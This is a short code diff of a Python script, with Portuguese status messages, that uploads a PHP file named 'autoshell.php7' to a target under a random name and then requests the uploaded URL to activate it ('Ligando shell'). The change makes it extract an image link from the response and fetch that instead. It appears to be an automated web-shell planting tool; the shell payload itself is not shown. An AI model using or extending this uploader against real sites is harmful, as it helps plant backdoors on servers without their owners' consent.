@@ -1,6 +1,7 @@
 from cn import Context
 from json import load
 from requests import get
+from hpparser import findImg
 from utils import randomString
 
 cnFile = "autoshell_base.php7"
@@ -24,4 +25,4 @@ print(" * Fazendo Upload")
 url = ctx.upload(randomString(8), 'autoshell.php7', open('autoshell.php7'))
 
 print(f" * Ligando shell url={url}")
-get(url)
+get(findImg(get(url, timeout=30).text), timeout=999)
